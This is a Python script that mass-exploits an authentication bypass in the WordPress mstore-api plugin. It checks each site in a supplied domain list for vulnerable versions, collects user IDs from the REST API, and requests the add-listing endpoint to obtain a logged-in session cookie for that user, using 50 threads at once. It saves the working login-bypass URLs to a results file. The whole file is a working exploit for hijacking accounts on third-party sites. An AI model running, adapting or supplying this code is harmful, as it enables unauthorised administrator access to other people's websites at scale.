import os
import click
import argparse
import requests
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import RequestException
from concurrent import futures

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


def version_check(wordpress_url):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    plugin_url = f"{wordpress_url}/wp-content/plugins/mstore-api/readme.txt"
    try:
        response = requests.get(plugin_url, headers=headers, verify=False, timeout=30)
        if response.status_code == 200:
            content = response.text

            version_line = next((line for line in content.split('\n') if line.startswith('Stable tag:')), None)
            if version_line:
                version = version_line.split(':')[1].strip()
                if version >= '3.9.3':
                    print(f"\033[91m{wordpress_url} > [Plugin NOT Vuln]\033[0m")  # Red color
                else:
                    print(f"\033[92m{wordpress_url} > [Plugin VULN]\033[0m")  # Green color
                    return True
            else:
                print(f"\033[91m{wordpress_url} > [Failed GET version]\033[0m")  # Red color
        else:
            print(f"\033[91m{wordpress_url} > [Failed to fetch the readme.txt file]\033[0m")  # Red color
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}
            response = session.get(f"{wordpress_url}/wp-json/", headers=headers, verify=False, timeout=30)
            if "add-listing" in response.text and "get-nearby-listings" in response.text:
                print(f"\033[91m{wordpress_url} > Was unable to read readme.txt but the plugin might be installed\033[0m")  # Red color
                return True
            else:
                print(f"\033[91m{wordpress_url} > [Plugin NO installed]\033[0m")  # Red color

    except (RequestException, ConnectionError) as e:
        print(f"\033[91m{wordpress_url} > [UKNOWN ERROR]\033[0m")  # Red color

    return False


def fetch_user_id(wordpress_url):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}
    try:
        response = session.get(f"{wordpress_url}/wp-json/wp/v2/users", headers=headers, verify=False, timeout=30)
        if response.status_code == 200:
            try:
                users = response.json()
                if users:
                    return users[0]['id']
            except json.JSONDecodeError as e:
                print(f"{wordpress_url} > [Failed to decode JSON response]")
        print(f"{wordpress_url} [Failed Get Username]")
    except (RequestException, ConnectionError) as e:
        print(f"\033[91m{wordpress_url} > [UKNOWN ERROR]\033[0m")  # Red color
    return None


def sendem(user_id, wordpress_url):
    # Set up the request headers
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    try:
        # Send the request
        response = session.get(f"{wordpress_url}/wp-json/wp/v2/add-listing?id={str(user_id)}", headers=headers, verify=False, timeout=30)
        cookies = requests.utils.dict_from_cookiejar(response.cookies)
        # Check if 'wordpress_logged_in_' cookie is present
        if any(cookie.startswith('wordpress_logged_in_') for cookie in cookies):
            print("\033[92mVisit the following URL: " + f"{wordpress_url}/wp-json/wp/v2/add-listing?id={str(user_id)}\033[0m")
            print("\033[92mVisit " + wordpress_url + " and you should be logged in as the user you have chosen.\033[0m")
            return True
        elif response.status_code == 403 and "cf-cookie-error" in response.text:
            print("Sorry, Cloudflare is blocking us.")
        else:
            print("Sorry, it does not appear that any cookies have been returned.")
    except (RequestException, ConnectionError) as e:
        print(f"\033[91m{wordpress_url} > [Uknown Error]\033[0m")  # Red color
    return False


def process_domain(domain):
    version_check(domain)
    user_id = fetch_user_id(domain)
    if user_id is not None:
        if sendem(user_id, domain):
            with open("results.txt", "a") as results_file:
                results_file.write(f"visit url: {domain}/wp-json/wp/v2/add-listing?id={str(user_id)}\n")
                results_file.write(f"vitis: {domain}\n\n")


def process_domains(file_path):
    with open(file_path, "r") as file:
        domains = file.read().splitlines()
        with futures.ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(process_domain, domains)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--file", required=True, help="Path to the file containing multiple domains")
    args = parser.parse_args()
    file_path = args.file
    process_domains(file_path)
